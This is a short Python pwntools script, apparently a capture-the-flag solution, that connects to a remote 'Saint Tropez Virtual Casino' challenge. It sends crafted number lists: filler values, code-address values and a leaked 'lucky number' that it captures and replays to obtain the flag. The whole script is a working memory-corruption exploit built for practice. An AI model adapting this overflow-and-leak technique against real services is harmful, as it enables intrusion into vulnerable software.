from pwn import *
import re

conn = remote('isc2023.1337.cx', 10091)

print(conn.recvline()) # Welcome to the Saint Tropez Virtual Casino!
print(conn.recvline()) # Please enter your name:

conn.send(b"Nume\n")

print(conn.recvline()) # Welcome, Nume
print(conn.recvline()) # Starting money: $xxxx
print(conn.recvline()) # \n
print(conn.recvline()) # Please enter the list of numbers you want to roll

conn.send(b"1 " * 37 + b"134514611 x \n")

# Your lucky number was: xxxx
lucky_number = str(conn.recvline())
print(lucky_number)
lucky_number = re.search(r'\d+', lucky_number).group()
print("Managed to get: ", lucky_number)

print(conn.recvline()) # You got: x out of x
print(conn.recvline()) # Account balance: $x
print(conn.recvregex(b"]")) # Continue? [Y/n]

conn.send(b"n\n")

print(conn.recvline()) # Okay, farewell!
print(conn.recvline()) # \n
print(conn.recvline()) # Please enter the list of numbers you want to roll

conn.send(b"1 " * 37 + b"134514406 1 " + bytes(lucky_number, 'ascii') + b" x\n")

print(conn.recvline()) # Your lucky number was: xxxx
print(conn.recvline()) # You got: x out of x
print(conn.recvline()) # Account balance: $x
print(conn.recvregex(b"]")) # Continue? [Y/n]

conn.send(b"n\n")

print(conn.recvline()) # Okay, farewell!
print("Found the flag: ", conn.recvline())

conn.close()
